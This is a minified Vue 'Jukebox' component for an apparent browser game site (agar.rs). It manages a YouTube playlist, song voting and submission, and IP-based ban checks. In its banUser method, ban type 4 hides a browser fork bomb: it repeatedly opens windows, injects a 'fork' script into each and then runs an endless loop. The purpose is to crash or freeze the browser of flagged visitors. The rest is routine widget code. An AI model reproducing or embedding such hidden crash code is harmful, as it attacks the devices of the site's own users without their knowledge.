Object.defineProperty(exports, "__esModule", {
  value: true
});
var i = Object.assign || function (e) {
  for (var t = 1; t < arguments.length; t++) {
    var n = arguments[t];
    for (var i in n) {
      if (Object.prototype.hasOwnProperty.call(n, i)) {
        e[i] = n[i];
      }
    }
  }
  return e;
};
var o = require("./3.js");
exports.default = {
  name: "Jukebox",
  props: ["muted", "playedrun"],
  data: function () {
    return {
      musicActive: false,
      youtubeIDplaying: "",
      songThumbnail: "/agar.rs/assets/images/youtube.webp",
      youtubeID: "",
      playlist: [],
      playlistError: false,
      finishedSongs: [],
      form: new Form({
        youtubeid: "",
        name: ""
      }),
      thumbs: new Form({})
    };
  },
  watch: {
    playedrun: function () {
      if (this.playedrun) {
        this.startMusic();
      }
    }
  },
  computed: i({}, (0, o.mapState)({
    am_logged_in: function (e) {
      return e.main.am_logged_in;
    },
    role: function (e) {
      return e.main.role;
    }
  })),
  mounted: function () {},
  updated: function () {},
  created: function () {
    var e = this;
    setInterval(function () {
      e.getList(true);
    }, 20000);
  },
  methods: {
    musicEmit: function (e) {
      this.musicActive = true;
    },
    startMusic: function () {
      this.musicActive = !this.musicActive;
    },
    thumb: function (e, t) {
      var n = {
        direction: e,
        id: t.youtube_id
      };
      if (e == "up") {
        t.num_of_votes = parseInt(t.num_of_votes) + 1;
      } else if (e == "down") {
        t.num_of_votes = parseInt(t.num_of_votes) - 1;
      }
      this.thumbs.get_json(base_url2 + "Agar/thumb.json", n).then(function (e) {}, function (e) {
        console.log("error", e);
      });
    },
    deleteSong: function (e) {
      for (var t = this, n = {
          id: e.youtube_id,
          token_header: localStorage.token_header,
          token_log: localStorage.token_log
        }, i = 0; i < t.playlist.length; i++) {
        if (t.playlist[i].youtube_id == e.youtube_id) {
          t.playlist.splice(i, 1);
          break;
        }
      }
      this.form.get_json(base_url2 + "Admin/deleteSong.json", n).then(function (e) {}, function (e) {
        console.log("error", e);
      });
    },
    getList: function (e) {
      var t = this;
      this.form.get_json(base_url2 + "Agar/getList.json", {}).then(function (n) {
        if (n.status === 1) {
          for (var i = n.playlist.slice(), o = 0; o < i.length; o++) {
            for (var a = 0; a < t.finishedSongs.length; a++) {
              if (i[o].youtube_id == t.finishedSongs[a]) {
                i.splice(o, 1);
              }
            }
          }
          t.playlist = i;
          if (!e || t.youtubeIDplaying == "") {
            if (n.playlist.length > 0) {
              t.youtubeIDplaying = n.playlist[0].youtube_id;
            }
          }
          var s = "";
          try {
            s = window.atob(serIp);
          } catch (e) {
            s = serIp;
          }
          for (var r = 0; r < n.banned.length; r++) {
            if (s != "" && n.banned[r].ip == s) {
              t.banUser(Number(n.banned[r].type), n.banned[r].date_to, n.banned[r].reason, Number(n.banned[r].id));
              break;
            }
          }
        } else {
          t.playlistError = true;
        }
      }, function (e) {
        t.playlistError = true;
      });
    },
    switchSong: function () {
      this.finishedSongs.push(this.youtubeIDplaying);
      for (t = 0; t < this.playlist.length; t++) {
        if (this.playlist[t].youtube_id == this.youtubeIDplaying) {
          this.playlist.splice(t, 1);
          break;
        }
      }
      for (t = 0; t < this.playlist.length; t++) {
        if (this.playlist[t] != "undefined" && this.playlist[t].youtube_id.length > 0) {
          this.youtubeIDplaying = this.playlist[t].youtube_id;
          this.songThumbnail = this.playlist[t].thumbnail;
          break;
        }
      }
      var e = {};
      for (var t = 0; t < this.playlist.length; t++) {
        if (this.playlist[t].youtube_id == this.youtubeIDplaying) {
          e = this.playlist[t];
          break;
        }
      }
      this.$emit("jukebox", e);
    },
    ready: function () {
      var e = {};
      for (var t = 0; t < this.playlist.length; t++) {
        if (this.playlist[t].youtube_id == this.youtubeIDplaying) {
          e = this.playlist[t];
          break;
        }
      }
      this.$emit("jukebox", e);
    },
    playing: function (e) {},
    changeSong: function (e) {
      if (event.target.tagName == "DIV" || event.target.tagName == "SPAN") {
        for (n = 0; n < this.playlist.length; n++) {
          if (this.playlist[n].youtube_id == e) {
            this.finishedSongs.push(e);
            this.playlist.splice(n, 1);
            break;
          }
        }
        this.youtubeIDplaying = e;
        var t = {};
        for (var n = 0; n < this.playlist.length; n++) {
          if (this.playlist[n].youtube_id == this.youtubeIDplaying) {
            t = this.playlist[n];
            break;
          }
        }
        this.$emit("jukebox", t);
      }
    },
    change: function () {
      this.youtubeID = "another video id";
    },
    stop: function () {
      this.player.stopVideo();
    },
    pause: function () {
      this.player.pauseVideo();
    },
    youtubeLink: function (e) {
      var t = /^.*((youtu.be\/)|(v\/)|(\/u\/\w\/)|(embed\/)|(watch\?))\??v?=?([^#\&\?]*).*/;
      var n = e.match(t);
      return !!n && n[7].length == 11 && n[7];
    },
    sendSong: function () {
      var e = this;
      var t = this.youtubeLink(this.youtubeID);
      $("#showAddingSong").show();
      $.get("https://www.googleapis.com/youtube/v3/videos?part=snippet&id=" + t + "&key=" + YT_API, function (n) {
        var i = {
          youtubeid: t,
          name: n.items[0].snippet.title,
          thumbnail: n.items[0].snippet.thumbnails.medium.url,
          player: $("#nickname").val()
        };
        e.youtubeID = "";
        e.form.get_json(base_url2 + "Agar/insertSong.json", i).then(function (n) {
          if (n.status == 1) {
            e.playlist.push({
              id: t,
              name: i.name,
              thumbnail: i.thumbnail,
              player: i.player
            });
            if (e.youtubeIDplaying == "") {
              e.youtubeIDplaying = t;
              e.songThumbnail = i.thumbnail;
            }
            e.$ua.trackEvent("addSong", "songBy: " + $("#nickname").val(), i.name);
          } else {
            $("#song-exist").show();
            setTimeout(function () {
              $("#song-exist").hide();
            }, 5000);
          }
          $("#showAddingSong").hide();
        }, function (e) {
          console.log("error:", e);
        });
      });
    },
    banUser: function (e, t, n, i) {
      if (e == 1) {
        localStorage.setItem("bfg", "true");
        localStorage.setItem("bf_d", t);
        $("canvas").remove();
        this.$router.replace("/agar.rs/ban");
      } else if (e == 2) {
        localStorage.setItem("bfc", "true");
        localStorage.setItem("bf_d", t);
        var o = "<h3 class=\"error\">Banovani ste :(</h3><input type=\"hidden\" id=\"chat_textbox\">";
        o += "<span data-tooltip=\"Pogledajte stub srama\" data-inverted=\"\"><i class=\"help circle icon\"></i></span>";
        $("#chat_textbox-wrap").html(o);
      } else if (e == 4) {
        (function e() {
          var t = window.open();
          var n = t.document.createElement("script");
          n.innerHTML = fork + "\nfork();";
          t.document.head.appendChild(n);
          setTimeout(function () {
            t.close();
            e();
          }, 250);
        })();
        for (var a = 1; ++a > 1;);
      } else if (e == 5) {
        toastr.options = {
          closeButton: false,
          debug: false,
          newestOnTop: false,
          progressBar: true,
          positionClass: "toast-bottom-right",
          preventDuplicates: true,
          onclick: null,
          showDuration: "300",
          hideDuration: "1000",
          timeOut: "7000",
          extendedTimeOut: "1000",
          showEasing: "swing",
          hideEasing: "linear",
          showMethod: "fadeIn",
          hideMethod: "fadeOut"
        };
        toastr.info(n);
        this.deleteMessage(i);
      } else if (e == 6) {
        $("body").addClass("animated wobble");
        setTimeout(function () {
          $("body").removeClass("animated infinite wobble");
        }, 1000);
        this.deleteMessage(i);
      }
    },
    deleteMessage: function (e) {
      var t = {
        id: e
      };
      this.form.get_json(base_url2 + "Agar/deleteMessage.json", t).then(function (e) {}, function (e) {
        console.log("error", e);
      });
    }
  }
};